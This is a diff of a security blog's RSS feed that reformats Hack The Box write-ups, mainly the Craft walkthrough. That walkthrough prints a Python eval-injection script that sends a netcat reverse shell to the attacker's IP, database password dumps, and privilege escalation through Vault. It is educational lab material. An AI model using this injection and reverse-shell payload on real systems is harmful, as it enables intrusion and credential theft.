+<pre><code class="language-console">root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# ssh 10.10.10.114 -l clave
+clave@10.10.10.114's password: 
 Last login: Fri Jan 10 19:45:16 2020 from 10.10.14.7
 clave@bitlab:~$ id
 uid=1000(clave) gid=1000(clave) groups=1000(clave)
@@ -552,7 +607,9 @@ drwx------ 3 clave clave  4096 Aug  8 14:40 .gnupg
 -r-------- 1 clave clave 13824 Jul 30 19:58 RemoteConnection.exe
 -r-------- 1 clave clave    33 Feb 28  2019 user.txt
 clave@bitlab:~$ wc -c user.txt 
-33 user.txt</code></pre></div>
+33 user.txt
+</code></pre>
+
 <p>We got user shell, and after listing the files in it&rsquo;s home there is an interesting .exe called <code>RemoteConnection.exe</code>, from here it will be needed to download that RemoteConnection.exe and start getting the hands dirty with some debugger to start doing reversing and see what it&rsquo;s hiding, but as I said before this will be an update in the future once I know how to do it :P.</p>
 
 <p>So far then we know this box has 2 ways to get root, I enjoyed quite a lot this box, and Im looking forward to do it again once I know some reversing.</p>
@@ -563,10 +620,10 @@ clave@bitlab:~$ wc -c user.txt
         
         <item>
             <title>Hack The Box - Craft</title>
-            <link>https://ceso.github.io/posts/2020/01/hack-the-box-craft/</link>
+            <link>https://ceso.github.io/posts/htb/craft/</link>
             <pubDate>Sat, 04 Jan 2020 00:00:00 +0000</pubDate>
             
-            <guid>https://ceso.github.io/posts/2020/01/hack-the-box-craft/</guid>
+            <guid>https://ceso.github.io/posts/htb/craft/</guid>
             <description>Quick Summary So!! Today was just retired Craft from Hack the box, this was a really fun box to do, and also I felt pretty well doing it, because even if I needed some nudges, it was actually the first box I got to the foothold without hints (elsen if I needed some guidance with python, thanks a lot @Frundrod!!), and afterward to get user I was a bit lost and also needed some hints (was not realizing something I have literally in my nose, thankss a lot @Fugl!</description>
             <content type="html"><![CDATA[
 
@@ -587,7 +644,8 @@ Today was just retired Craft from Hack the box, this was a really fun box to do,
 <h2 id="nmap">Nmap</h2>
 
 <p>We start running nmap to scan for open ports and services:</p>
-<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# nmap -sC -sV -O 10.10.10.110 -o ininitial-nmap.htb
+
+<pre><code class="language-console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# nmap -sC -sV -O 10.10.10.110 -o ininitial-nmap.htb
 Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-23 17:21 EST
 Nmap scan report for 10.10.10.110
 Host is up (0.082s latency).
@@ -626,7 +684,9 @@ Network Distance: 2 hops
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 32.11 seconds</code></pre></div>
+Nmap done: 1 IP address (1 host up) scanned in 32.11 seconds
+</code></pre>
+
 <p>We got port port 22 (SSH) and 443 (HTTPS) are open.</p>
 
 <h2 id="web-enumeration">Web enumeration</h2>
@@ -710,43 +770,56 @@ Nmap done: 1 IP address (1 host up) scanned in 32.11 seconds</code></pre></div>
 
 <p>Now with credentials, knowing we could take advantage of the <code>eval()</code> and remembering the curl Denish was using in his issue + the API, we can make an injection via a POST to <code>/api/brew/</code>.
 I wrote a small script to authenticate and post that does the injection (tbh, I missed I could just use <code>test.py</code> realized about it late). grabbing the token and using it to authenticate.</p>
-<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# cat craft_inject.py 
+
+<pre><code class="language-console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# cat craft_inject.py 
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
 import requests
 import re
 import json
 
-url = &#34;https://api.craft.htb/api/auth/login&#34;
-login=(&#39;dinesh&#39;, &#39;4aUh0A8PbVJxgd&#39;)
+url = &quot;https://api.craft.htb/api/auth/login&quot;
+login=('dinesh', '4aUh0A8PbVJxgd')
 r = requests.get(url, auth=login, allow_redirects=False, verify=False)
-token = json.loads(r.text)[&#39;token&#39;]
+token = json.loads(r.text)['token']
 print(token)
-url = &#34;https://api.craft.htb/api/brew/&#34;
-headers = {&#39;X-Craft-API-Token&#39;:token, &#39;Content-Type&#39;: &#39;application/json&#39;}
-inject = &#34;&#34;&#34;__import__(&#34;os&#34;).system(&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.16 4444 &gt;/tmp/f&#34;)&#34;&#34;&#34;
-payload = {&#34;name&#34;:&#34;foo&#34;,&#34;brewer&#34;:&#34;foo&#34;, &#34;style&#34;:&#34;foo&#34;, &#34;abv&#34;:inject}
+url = &quot;https://api.craft.htb/api/brew/&quot;
+headers = {'X-Craft-API-Token':token, 'Content-Type': 'application/json'}
+inject = &quot;&quot;&quot;__import__(&quot;os&quot;).system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.16 4444 &gt;/tmp/f&quot;)&quot;&quot;&quot;
+payload = {&quot;name&quot;:&quot;foo&quot;,&quot;brewer&quot;:&quot;foo&quot;, &quot;style&quot;:&quot;foo&quot;, &quot;abv&quot;:inject}
 payload = json.dumps(payload)
-attack = requests.post(url, verify=False, headers=headers, allow_redirects=False, data=payload)</code></pre></div>
+attack = requests.post(url, verify=False, headers=headers, allow_redirects=False, data=payload)
+</code></pre>
+
 <p>In one tab run nc listening on port 4444 with <code>nc -lvp 4444</code>, and run in other tab we run the script to get the reverse:</p>
-<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# ./craft_inject.py </code></pre></div><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# nc -lvp 4444
+
+<pre><code class="language-console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# ./craft_inject.py 
+</code></pre>
+
+<pre><code class="language-console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# nc -lvp 4444
 listening on [any] 4444 ...
 connect to [10.10.14.16] from api.craft.htb [10.10.10.110] 41887
-/bin/sh: can&#39;t access tty; job control turned off
+/bin/sh: can't access tty; job control turned off
 /opt/app # whoami
 root
 /opt/app # id
-uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)</code></pre></div>
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+</code></pre>
+
 <p>There is something weird, we are already root? we check if there is the <code>root.txt</code> in it&rsquo;s home and not, is not:</p>
-<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">/opt/app # cd /root
+
+<pre><code class="language-console">/opt/app # cd /root
 /root # ls -la
 total 12
 drwx------    1 root     root          4096 Feb  9  2019 .
 drwxr-xr-x    1 root     root          4096 Feb 10  2019 ..
 drwx------    1 root     root          4096 Feb  9  2019 .cache
-/root # </code></pre></div>
+/root # 
+</code></pre>
+
 <p>So we start enumerating and realize we are inside a jail (specifically a docker container, busybox):</p>
-<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">/opt/app # ls -la /
+
+<pre><code class="language-console">/opt/app # ls -la /
 total 64
 drwxr-xr-x    1 root     root          4096 Feb 10  2019 .
 drwxr-xr-x    1 root     root          4096 Feb 10  2019 ..
@@ -800,9 +873,12 @@ lrwxrwxrwx    1 root     root            12 Feb  6  2019 comm -&gt; /bin/busybox
 lrwxrwxrwx    1 root     root            12 Jan 30  2019 cpio -&gt; /bin/busybox
 -rwxr-xr-x    1 root     root        898192 Jan  3  2019 cpp
 lrwxrwxrwx    1 root     root            12 Jan 30  2019 crontab -&gt; /bin/busybox
-lrwxrwxrwx    1 root     root            12 Jan 30  2019 cryptpw -&gt; /bin/busybox</code></pre></div>
+lrwxrwxrwx    1 root     root            12 Jan 30  2019 cryptpw -&gt; /bin/busybox
+</code></pre>
+
 <p>Inside the directory were we started <code>/opt/app</code> we see if there is something interesting:</p>
-<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">/opt/app # ls -la
+
+<pre><code class="language-console">/opt/app # ls -la
 total 32
 drwxr-xr-x    5 root     root          4096 Feb 10  2019 .
 drwxr-xr-x    1 root     root          4096 Feb  9  2019 ..
@@ -812,19 +888,22 @@ drwxr-xr-x    8 root     root          4096 Feb  8  2019 .git
 drwxr-xr-x    5 root     root          4096 Feb  7  2019 craft_api
 -rwxr-xr-x    1 root     root           673 Feb  8  2019 dbtest.py
 drwxr-xr-x    2 root     root          4096 Feb  7  2019 tests
-/opt/app # grep -ir &#39;\(pass\|password\|passwd\)&#39; *       
-app.py:    flask_app.config[&#39;SQLALCHEMY_DATABASE_URI&#39;] = &#39;mysql+pymysql://%s:%s@%s/%s&#39; % ( settings.MYSQL_DATABASE_USER, settings.MYSQL_DATABASE_PASSWORD, settings.MYSQL_DATABASE_HOST, settings.MYSQL_DATABASE_DB)
+/opt/app # grep -ir '\(pass\|password\|passwd\)' *       
+app.py:    flask_app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://%s:%s@%s/%s' % ( settings.MYSQL_DATABASE_USER, settings.MYSQL_DATABASE_PASSWORD, settings.MYSQL_DATABASE_HOST, settings.MYSQL_DATABASE_DB)
 craft_api/api/auth/endpoints/__pycache__/auth.cpython-36.pyc:        Create an authentication token provided valid username and password.
 craft_api/api/auth/endpoints/auth.py:        auth_results = User.query.filter(User.username == auth.username, User.password == auth.password).one()
 craft_api/api/auth/endpoints/auth.py:        Create an authentication token provided valid username and password.
 craft_api/database/models.py:    password = db.Column(db.String(80))
 craft_api/database/models.py:    def __init__(self, username, password):
 craft_api/database/models.py:        self.password = password
-craft_api/settings.py:MYSQL_DATABASE_PASSWORD = &#39;qLGockJ6G2J75O&#39;
+craft_api/settings.py:MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
 dbtest.py:                             password=settings.MYSQL_DATABASE_PASSWORD,
-/opt/app # </code></pre></div>
+/opt/app # 
+</code></pre>
+
 <p>There we see we have credentials for the database, we took a deep look into <code>craft_api/settings.py</code> to see which one is the user, and it&rsquo;s <code>craft</code>, we take a look into the <code>dbtest.py</code> we found early under <code>/opt/app</code>:</p>
-<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">/opt/app # cat dbtest.py
+
+<pre><code class="language-console">/opt/app # cat dbtest.py
 #!/usr/bin/env python
 
 import pymysql
@@ -840,29 +919,37 @@ connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
 
 try: 
     with connection.cursor() as cursor:
-        sql = &#34;SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1&#34;
+        sql = &quot;SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1&quot;
         cursor.execute(sql)
         result = cursor.fetchone()
         print(result)
 
 finally:
     connection.close()
-/opt/app #</code></pre></div>
+/opt/app #
+</code></pre>
+
 <p>It&rsquo;s using pymsql to interact with the database, going to the documentation of it, we see that what we need is to use the <code>method fetchall()</code>
 
     <img src="/images/htb/craft/1-rce.png"  class="center"  style="border-radius: 8px;"  />
 
 
 So, I change the script to do a <code>show tables</code> using <code>fetchall()</code> instead of <code>fetchone()</code>:</p>
-<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">/opt/app # sed -i &#39;s/result \= cursor.fetchone()/sql \= \&#34;show tables\&#34;/&#39; dbtest.py
-/opt/app # sed -i &#39;s/result \= cursor.fetchone()/result \= cursor.fetchall()/&#39; dbtest.py</code></pre></div>
+
+<pre><code class="language-console">/opt/app # sed -i 's/result \= cursor.fetchone()/sql \= \&quot;show tables\&quot;/' dbtest.py
+/opt/app # sed -i 's/result \= cursor.fetchone()/result \= cursor.fetchall()/' dbtest.py
+</code></pre>
+
 <p>And post that, we ran the script, and we get 2 tables one that looks interesting named <code>user</code>, we modify again the sql query but to select all the records from that table:</p>
-<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">/opt/app # python dbtest.py
-[{&#39;Tables_in_craft&#39;: &#39;brew&#39;}, {&#39;Tables_in_craft&#39;: &#39;user&#39;}]
-/opt/app # sed -i &#39;s/sql \= \&#34;show tables\&#34;/sql \= \&#34;SELECT * FROM user\&#34;/&#39; dbtest.py
+
+<pre><code class="language-console">/opt/app # python dbtest.py
+[{'Tables_in_craft': 'brew'}, {'Tables_in_craft': 'user'}]
+/opt/app # sed -i 's/sql \= \&quot;show tables\&quot;/sql \= \&quot;SELECT * FROM user\&quot;/' dbtest.py
 /opt/app # python dbtest.py
-[{&#39;id&#39;: 1, &#39;username&#39;: &#39;dinesh&#39;, &#39;password&#39;: &#39;4aUh0A8PbVJxgd&#39;}, {&#39;id&#39;: 4, &#39;username&#39;: &#39;ebachman&#39;, &#39;password&#39;: &#39;llJ77D8QFkLPQB&#39;}, {&#39;id&#39;: 5, &#39;username&#39;: &#39;gilfoyle&#39;, &#39;password&#39;: &#39;ZEU3N8WNM2rh4T&#39;}]
-/opt/app # </code></pre></div>
+[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
+/opt/app # 
+</code></pre>
+
 <p>So, we got the users <code>dinesh, ebachman and gilfoyle</code> and it&rsquo;s respective passwords, with that we go to <code>https://gogs.craft.htb</code> again and login as <code>gilfoyle</code> and we found that he has a private repo to deploy the infra called <code>craft-infra</code></p>
 
 
@@ -883,7 +970,8 @@ So, I change the script to do a <code>show tables</code> using <code>fetchall()<
 
 
 <p>We try to login via ssh as <code>gilfoyle</code> re-using the password we got earlier and we found a success (actually the first tries it failed for me, and spent some hours trying to break the id_rsa with john without success, so give a new try with trying the founded passwords):</p>
-<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# ssh gilfoyle@10.10.10.110 -i id_rsa
+
+<pre><code class="language-console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# ssh gilfoyle@10.10.10.110 -i id_rsa
 
 
   .   *   ..  . *  *
@@ -902,7 +990,7 @@ So, I change the script to do a <code>show tables</code> using <code>fetchall()<
 
 
 
-Enter passphrase for key &#39;id_rsa&#39;: 
+Enter passphrase for key 'id_rsa': 
 Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64
 
 The programs included with the Debian GNU/Linux system are free software;
@@ -915,15 +1003,18 @@ Last login: Fri Jan  3 23:45:10 2020 from 10.10.14.16
 gilfoyle@craft:~$ id
 uid=1001(gilfoyle) gid=1001(gilfoyle) groups=1001(gilfoyle)
 gilfoyle@craft:~$ wc -c user.txt 
-33 user.txt</code></pre></div>
+33 user.txt
+</code></pre>
+
 <h2 id="root">root</h2>
 
 <p>We start enumerating to see if we can find anything interesting in the home of gilfoyle, and we found a <code>.vault-token</code> file (vault is a tool for securely access/store secrets as tokens, passowrds, certificates, etc, to learn more about it go to <a href="https://www.vaultproject.io/" target="_blank">Vault project page</a>), and try to login to vault with it which goes well.</p>
-<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">gilfoyle@craft:~$ cat .vault-token 
+
+<pre><code class="language-console">gilfoyle@craft:~$ cat .vault-token 
 f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9gilfoyle@craft:~$ vault login
 Token (will be hidden): 
 Success! You are now authenticated. The token information displayed below
-is already stored in the token helper. You do NOT need to run &#34;vault login&#34;
+is already stored in the token helper. You do NOT need to run &quot;vault login&quot;
 again. Future Vault requests will automatically use this token.
 
 Key                  Value
@@ -932,17 +1023,20 @@ token                f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
 token_accessor       1dd7b9a1-f0f1-f230-dc76-46970deb5103
 token_duration       ∞
 token_renewable      false
-token_policies       [&#34;root&#34;]
+token_policies       [&quot;root&quot;]
 identity_policies    []
-policies             [&#34;root&#34;]
-gilfoyle@craft:~$ </code></pre></div>
+policies             [&quot;root&quot;]
+gilfoyle@craft:~$ 
+</code></pre>
+
 <p>We go back to the repo of <code>craft-infra</code> inside the <code>vault</code> folder to see if we can find the secret stored, in it is a small script <code>secrets.sh</code> which has exactly what we need:
 
     <img src="/images/htb/craft/4-gil.png"  class="center"  style="border-radius: 8px;"  />
 
 
 with this information we run vault to get the kv if the secret is indeed there:</p>
-<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">gilfoyle@craft:~$ vault kv get ssh/roles/root_otp
+
+<pre><code class="language-console">gilfoyle@craft:~$ vault kv get ssh/roles/root_otp
 ========== Data ==========
 Key                  Value
 ---                  -----
@@ -951,10 +1045,13 @@ cidr_list            0.0.0.0/0
 default_user         root
 exclude_cidr_list    n/a
 key_type             otp
-port                 22</code></pre></div>
+port                 22
+</code></pre>
+
 <p>We know it is a ssh secret for root (that means, we can use it to establish a connection against root over ssh) with an otp key (<a href="https://en.wikipedia.org/wiki/One-time_password" target="_blank">One-Time Password</a>)
 We check what options vault provides to use it:</p>
-<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">gilfoyle@craft:~$ vault
+
+<pre><code class="language-console">gilfoyle@craft:~$ vault
 Usage: vault &lt;command&gt; [args]
 
 Common commands:
@@ -971,7 +1068,7 @@ Common commands:
 Other commands:
     audit          Interact with audit devices
     auth           Interact with auth methods
-    kv             Interact with Vault&#39;s Key-Value storage
+    kv             Interact with Vault's Key-Value storage
     lease          Interact with leases
     namespace      Interact with namespaces
     operator       Perform operator-specific tasks
@@ -1007,10 +1104,13 @@ Usage: vault ssh [options] username@ip [ssh options]
           -host-key-hostnames=example.com \
           user@example.com
 
-  For the full list of options and arguments, please see the documentation.</code></pre></div>
+  For the full list of options and arguments, please see the documentation.
+</code></pre>
+
 <p>Is clear is needed to execute something like <code>vault ssh -mode=otp -role=my-role user@1.2.3.4</code>, so we do it:</p>
-<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">gilfoyle@craft:~$  vault ssh -mode=otp -role=root_otp root@127.0.0.1
-Vault could not locate &#34;sshpass&#34;. The OTP code for the session is displayed
+
+<pre><code class="language-console">gilfoyle@craft:~$  vault ssh -mode=otp -role=root_otp root@127.0.0.1
+Vault could not locate &quot;sshpass&quot;. The OTP code for the session is displayed
 below. Enter this code in the SSH password prompt. If you install sshpass,
 Vault can automatically perform this step for you.
 OTP for the session is: 6290d45c-541f-fb96-32c7-3e5a8aa4a256
@@ -1044,7 +1144,9 @@ permitted by applicable law.
 Last login: Sat Jan  4 00:46:56 2020 from 127.0.0.1
 root@craft:~# wc -c root.txt
 33 root.txt
-root@craft:~# </code></pre></div>
+root@craft:~# 
+</code></pre>
+
 <p>And we own root!!
 Again I enjoyed quite a lot doing this box a few hours it was going to be retired, and again thanks @Frundrod and <a href="https://www.hackthebox.eu/profile/103596" target="_blank">@Fugl</a> for pointing me in the right direction.</p>
 
@@ -1054,10 +1156,10 @@ Again I enjoyed quite a lot doing this box a few hours it was going to be retire
         
         <item>
             <title>shutdown -r now</title>
-            <link>https://ceso.github.io/posts/2019/12/shutdown-r-now/</link>
+            <link>https://ceso.github.io/posts/blog/shutdown-r-now/</link>
             <pubDate>Sun, 22 Dec 2019 00:00:00 +0000</pubDate>
             
-            <guid>https://ceso.github.io/posts/2019/12/shutdown-r-now/</guid>
+            <guid>https://ceso.github.io/posts/blog/shutdown-r-now/</guid>
             <description>Note: First than everything, sorry the english, is not my native language and always learning new stuff about it.
 I have always been thinking about writing a blog, but my mindset has always been the same &amp;ldquo;me? a blog? what am I supposed to post! I can&amp;rsquo;t even think anything I could share with people, I don&amp;rsquo;t know nothing compared to the people who blogs!&amp;ldquo;, currently that mindset has been changing.</description>
             <content type="html"><![CDATA[<p>Note: First than everything, sorry the english, is not my native language and always learning new stuff about it.</p>
